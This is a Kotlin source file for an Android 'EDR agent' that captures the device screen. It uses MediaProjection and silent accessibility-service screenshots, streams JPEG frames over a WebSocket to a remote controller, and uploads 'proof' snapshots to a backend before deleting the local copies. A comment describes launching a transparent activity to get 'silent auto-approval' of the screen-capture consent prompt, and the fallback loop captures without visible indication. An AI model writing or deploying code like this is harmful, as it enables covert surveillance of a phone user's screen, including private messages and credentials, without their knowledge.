package com.edr.agent.screen

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import com.edr.agent.service.EdrAccessibilityService
import com.edr.agent.storage.EdrLocalStorage
import com.edr.agent.storage.SyncPreferences
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledFuture
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * High-performance Dual-Engine Screen Streaming System for Phone EDR.
 *
 * Engine 1 (Primary - Ultra Smooth 15-20 FPS):
 * Hardware-accelerated VirtualDisplay & ImageReader via MediaProjection.
 * Zero CPU compositor capture, sub-40ms latency, fluid rapid scrolling.
 *
 * Engine 2 (Autonomous Accessibility Fallback):
 * Silent system screenshot via AccessibilityService API.
 */
object ScreenStreamManager {
    private const val TAG = "ScreenStreamManager"

    private val isStreaming = AtomicBoolean(false)
    private val isCapturingFrame = AtomicBoolean(false)
    private var lastCaptureStartTime = 0L
    private val streamExecutor = Executors.newSingleThreadScheduledExecutor()
    private var streamTask: ScheduledFuture<*>? = null
    private var frameSequence = 0L

    // MediaProjection VirtualDisplay Engine
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var lastVirtualDisplayFrameTime = 0L
    private val streamThread = android.os.HandlerThread("EDR_ScreenStreamThread").apply { start() }
    private val backgroundHandler = Handler(streamThread.looper)
    @Volatile
    private var nextAllowedScreenshotTime = 0L

    // Reusable bitmap for zero-allocation 15 FPS image copying
    private var reusableRawBitmap: Bitmap? = null
    private var reusableCleanBitmap: Bitmap? = null
    private var reusableByteArray: ByteArray? = null

    // Registered WebSocket sender lambda provided by EdrWebSocketClient
    var wsSender: ((String) -> Boolean)? = null

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()
    private val gson = Gson()
    private val jsonMediaType = "application/json; charset=utf-8".toMediaType()

    fun isStreamingActive(): Boolean = isStreaming.get()

    /**
     * Callback received from MediaProjectionCaptureActivity when system authorization is granted.
     */
    @Synchronized
    fun onMediaProjectionGranted(context: Context, resultCode: Int, data: Intent) {
        try {
            val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager
            if (mpm != null) {
                mediaProjection?.stop()
                mediaProjection = mpm.getMediaProjection(resultCode, data)
                Log.i(TAG, "MediaProjection acquired successfully! Ready for 15+ FPS smooth streaming.")
                EdrLocalStorage.appendEdrLog(context, "STREAM", "MediaProjection acquired (15+ FPS Engine Enabled)")

                if (isStreaming.get()) {
                    startVirtualDisplayStream(context)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed creating MediaProjection: ${e.message}", e)
            EdrLocalStorage.appendEdrLog(context, "STREAM_ERR", "Failed creating MediaProjection: ${e.message}")
        }
    }

    @Synchronized
    fun startStreaming(context: Context): Pair<String, String> {
        val a11y = EdrAccessibilityService.instance
        if (a11y == null && mediaProjection == null) {
            Log.e(TAG, "Cannot start live screen stream: Neither Accessibility nor MediaProjection is ready.")
            val errMsg = gson.toJson(
                mapOf(
                    "type" to "SCREEN_STREAM_STATUS",
                    "deviceId" to SyncPreferences.deviceId,
                    "payload" to mapOf(
                        "active" to false,
                        "error" to "Accessibility Service not enabled. Please enable EDR Agent in Accessibility Settings."
                    )
                )
            )
            wsSender?.invoke(errMsg)
            return Pair("FAILED", "Accessibility Service is not enabled on device.")
        }

        if (isStreaming.get()) {
            Log.i(TAG, "Screen stream already running. Verifying active engine...")
            if (mediaProjection != null && virtualDisplay == null) {
                startVirtualDisplayStream(context)
            } else if (mediaProjection == null && virtualDisplay == null && streamTask == null) {
                startAccessibilityFallbackLoop(context)
            }
            return Pair("EXECUTED", "Live screen stream is active.")
        }
        isStreaming.set(true)

        Log.i(TAG, "Starting ultra-smooth live screen stream over WebSocket...")

        // Broadcast stream started status
        val targetFps = if (mediaProjection != null) 15.0 else 2.5
        val startMsg = gson.toJson(
            mapOf(
                "type" to "SCREEN_STREAM_STATUS",
                "deviceId" to SyncPreferences.deviceId,
                "payload" to mapOf(
                    "active" to true,
                    "targetFps" to targetFps
                )
            )
        )
        wsSender?.invoke(startMsg)

        // 3. Prefer Engine 1: VirtualDisplay 15 FPS if MediaProjection is available
        if (mediaProjection != null) {
            startVirtualDisplayStream(context)
        } else {
            // Attempt to trigger silent auto-approval via transparent activity
            try {
                MediaProjectionCaptureActivity.launch(context)
            } catch (e: Exception) {
                Log.w(TAG, "Cannot launch MediaProjectionCaptureActivity: ${e.message}")
            }
            // Run Engine 2 (Accessibility Fallback)
            startAccessibilityFallbackLoop(context)
        }

        return Pair("EXECUTED", "Live screen stream successfully started.")
    }

    /**
     * Engine 1: High-framerate (15 FPS) VirtualDisplay stream directly from GPU compositor.
     */
    private fun startVirtualDisplayStream(context: Context) {
        val proj = mediaProjection ?: return
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null

            // Android 14+ requirement: Register callback before creating VirtualDisplay
            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.i(TAG, "MediaProjection stopped by system.")
                    EdrLocalStorage.appendEdrLog(context, "STREAM", "MediaProjection stopped by system.")
                    virtualDisplay?.release()
                    virtualDisplay = null
                    imageReader?.close()
                    imageReader = null
                }
            }, backgroundHandler)

            val targetWidth = 540
            val targetHeight = 1200
            val targetDensity = 220

            imageReader = ImageReader.newInstance(targetWidth, targetHeight, PixelFormat.RGBA_8888, 2)
            virtualDisplay = proj.createVirtualDisplay(
                "EDR_ScreenStream",
                targetWidth, targetHeight, targetDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null,
                backgroundHandler
            )

            imageReader!!.setOnImageAvailableListener({ reader ->
                if (!isStreaming.get()) return@setOnImageAvailableListener

                val now = System.currentTimeMillis()
                // Throttle to ~15 FPS (at least 65ms between frames)
                if (now - lastVirtualDisplayFrameTime < 65) {
                    reader.acquireLatestImage()?.close()
                    return@setOnImageAvailableListener
                }
                lastVirtualDisplayFrameTime = now

                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                image.use { currentImage ->
                    try {
                        val planes = currentImage.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * targetWidth
                        val allocWidth = targetWidth + rowPadding / pixelStride
                        val requiredBytes = allocWidth * targetHeight * 4

                        var rawBitmap = reusableRawBitmap
                        if (rawBitmap == null || rawBitmap.width != allocWidth || rawBitmap.height != targetHeight || rawBitmap.isRecycled) {
                            rawBitmap = Bitmap.createBitmap(allocWidth, targetHeight, Bitmap.Config.ARGB_8888)
                            reusableRawBitmap = rawBitmap
                        }

                        if (buffer.remaining() >= requiredBytes) {
                            rawBitmap.copyPixelsFromBuffer(buffer)
                        } else {
                            var byteArr = reusableByteArray
                            if (byteArr == null || byteArr.size != requiredBytes) {
                                byteArr = ByteArray(requiredBytes)
                                reusableByteArray = byteArr
                            }
                            val remaining = buffer.remaining()
                            buffer.get(byteArr, 0, remaining)
                            val byteBuf = java.nio.ByteBuffer.wrap(byteArr)
                            rawBitmap.copyPixelsFromBuffer(byteBuf)
                        }

                        val cleanBitmap = if (rowPadding == 0) {
                            rawBitmap
                        } else {
                            Bitmap.createBitmap(rawBitmap, 0, 0, targetWidth, targetHeight)
                        }

                        val bos = ByteArrayOutputStream()
                        cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
                        val frameBytes = bos.toByteArray()
                        val base64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
                        val w = cleanBitmap.width
                        val h = cleanBitmap.height
                        if (cleanBitmap != rawBitmap) {
                            cleanBitmap.recycle()
                        }

                        val seq = ++frameSequence
                        val frameMsg = gson.toJson(
                            mapOf(
                                "type" to "SCREEN_FRAME",
                                "deviceId" to SyncPreferences.deviceId,
                                "payload" to mapOf(
                                    "frameBase64" to base64,
                                    "seq" to seq,
                                    "fps" to 15,
                                    "captureTime" to now,
                                    "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                                    "width" to w,
                                    "height" to h,
                                    "frameSizeBytes" to frameBytes.size
                                )
                            )
                        )
                        val sent = wsSender?.invoke(frameMsg) ?: false

                        if (seq == 1L || seq % 15L == 1L) {
                            EdrLocalStorage.appendEdrLog(context, "STREAM_VD", "VD Frame #$seq sent ($w x $h, ${frameBytes.size}B @ 15 FPS, wsSent: $sent)")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error encoding VirtualDisplay frame: ${e.message}", e)
                        EdrLocalStorage.appendEdrLog(context, "STREAM_ERR", "Error encoding VD frame: ${e.message}")
                    }
                }
            }, backgroundHandler)

            Log.i(TAG, "VirtualDisplay 15 FPS capture engine running successfully!")
            EdrLocalStorage.appendEdrLog(context, "STREAM", "VirtualDisplay 15 FPS capture engine running")

            // Ensure fallback loop is alive as safety net for stationary screens
            startAccessibilityFallbackLoop(context)
        } catch (e: Exception) {
            Log.e(TAG, "Failed creating VirtualDisplay: ${e.message}", e)
            EdrLocalStorage.appendEdrLog(context, "STREAM_ERR", "Failed creating VirtualDisplay: ${e.message}")
            startAccessibilityFallbackLoop(context)
        }
    }

    /**
     * Engine 2: Accessibility Screenshot Loop (Intelligent fallback & safety net).
     */
    private fun startAccessibilityFallbackLoop(context: Context) {
        if (streamTask != null && !streamTask!!.isCancelled) return

        streamTask = streamExecutor.scheduleWithFixedDelay({
            if (!isStreaming.get()) return@scheduleWithFixedDelay

            val now = System.currentTimeMillis()
            // If VirtualDisplay is actively delivering frames (within last 1200ms), no fallback needed!
            if (now - lastVirtualDisplayFrameTime < 1200) {
                return@scheduleWithFixedDelay
            }
            if (now < nextAllowedScreenshotTime) {
                return@scheduleWithFixedDelay
            }

            if (isCapturingFrame.get()) {
                if (now - lastCaptureStartTime > 2000) {
                    Log.w(TAG, "Frame capture lock timed out (>2000ms). Resetting lock.")
                    isCapturingFrame.set(false)
                } else {
                    return@scheduleWithFixedDelay
                }
            }
            isCapturingFrame.set(true)
            lastCaptureStartTime = now

            try {
                val service = EdrAccessibilityService.instance
                if (service == null) {
                    Log.w(TAG, "Accessibility service disconnected during stream.")
                    stopStreaming()
                    return@scheduleWithFixedDelay
                }

                val captureStartTime = System.currentTimeMillis()
                service.takeSilentScreenshot(540) { scaledBitmap ->
                    try {
                        if (scaledBitmap != null && isStreaming.get()) {
                            val bos = ByteArrayOutputStream()
                            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 60, bos)
                            val frameBytes = bos.toByteArray()
                            val base64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
                            val w = scaledBitmap.width
                            val h = scaledBitmap.height
                            scaledBitmap.recycle()

                            val seq = ++frameSequence
                            val frameMsg = gson.toJson(
                                mapOf(
                                    "type" to "SCREEN_FRAME",
                                    "deviceId" to SyncPreferences.deviceId,
                                    "payload" to mapOf(
                                        "frameBase64" to base64,
                                        "seq" to seq,
                                        "captureTime" to captureStartTime,
                                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                                        "width" to w,
                                        "height" to h,
                                        "frameSizeBytes" to frameBytes.size
                                    )
                                )
                            )

                            val sent = wsSender?.invoke(frameMsg) ?: false
                            if (seq == 1L || seq % 5L == 1L) {
                                EdrLocalStorage.appendEdrLog(service, "STREAM", "Fallback Frame #$seq sent ($w x $h, ${frameBytes.size}B, sent: $sent)")
                            }
                        } else {
                            // If screenshot failed (e.g. rate limit error 3), back off by 1200ms
                            nextAllowedScreenshotTime = System.currentTimeMillis() + 1200L
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error encoding screen frame: ${e.message}")
                        nextAllowedScreenshotTime = System.currentTimeMillis() + 1200L
                    } finally {
                        isCapturingFrame.set(false)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error during fallback capture tick: ${e.message}")
                isCapturingFrame.set(false)
                nextAllowedScreenshotTime = System.currentTimeMillis() + 1200L
            }
        }, 100, 1000, TimeUnit.MILLISECONDS)
    }

    @Synchronized
    fun stopStreaming(): Pair<String, String> {
        if (!isStreaming.getAndSet(false)) {
            return Pair("EXECUTED", "Live screen stream is already stopped.")
        }

        Log.i(TAG, "Stopping live screen stream.")

        // Finish projection activity
        MediaProjectionCaptureActivity.finishActive()

        // Stop Video
        streamTask?.cancel(true)
        streamTask = null
        isCapturingFrame.set(false)

        try {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e(TAG, "Error releasing virtual display: ${e.message}")
        }

        val stopMsg = gson.toJson(
            mapOf(
                "type" to "SCREEN_STREAM_STATUS",
                "deviceId" to SyncPreferences.deviceId,
                "payload" to mapOf("active" to false)
            )
        )
        wsSender?.invoke(stopMsg)

        return Pair("EXECUTED", "Live screen stream stopped.")
    }

    /**
     * Captures a single full-resolution screen snapshot as legal/audit proof,
     * stores it in /sdcard/EDR/photos/, uploads it to the central backend,
     * and deletes the local file.
     */
    fun captureProofSnapshot(context: Context, callback: (Boolean, String) -> Unit) {
        val a11y = EdrAccessibilityService.instance
        if (a11y == null) {
            callback(false, "Accessibility Service is not enabled")
            return
        }

        a11y.takeSilentScreenshot { bitmap ->
            if (bitmap == null) {
                callback(false, "Failed taking silent screen snapshot")
                return@takeSilentScreenshot
            }

            Thread {
                var proofFile: File? = null
                try {
                    val bos = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 85, bos)
                    val bytes = bos.toByteArray()
                    bitmap.recycle()

                    // Save temp file in /EDR/photos/
                    val photosDir = EdrLocalStorage.getPhotosDir(context)
                    val filename = "screen_proof_${System.currentTimeMillis()}.jpg"
                    proofFile = File(photosDir, filename)
                    proofFile.writeBytes(bytes)
                    EdrLocalStorage.appendEdrLog(context, "PROOF", "Captured screen proof snapshot: $filename")

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    val payload = mapOf(
                        "deviceId" to SyncPreferences.deviceId,
                        "timestamp" to SyncPreferences.getCurrentIsoTimestamp(),
                        "frontPhotoBase64" to base64,
                        "triggerReason" to "Manual Live Screen Forensic Proof Capture"
                    )

                    val body = gson.toJson(payload).toRequestBody(jsonMediaType)
                    val url = "${SyncPreferences.httpBaseUrl}/api/devices/${SyncPreferences.deviceId}/photos"
                    val request = Request.Builder().url(url).post(body).build()

                    val response = httpClient.newCall(request).execute()
                    val ok = response.isSuccessful
                    response.close()

                    if (ok) {
                        Log.i(TAG, "Proof snapshot successfully uploaded to server")
                        proofFile.delete()
                        callback(true, "Proof snapshot saved and uploaded to server.")
                    } else {
                        callback(false, "Server rejected snapshot: HTTP ${response.code}")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error saving proof snapshot: ${e.message}", e)
                    proofFile?.delete()
                    callback(false, "Snapshot error: ${e.message}")
                }
            }.start()
        }
    }
}
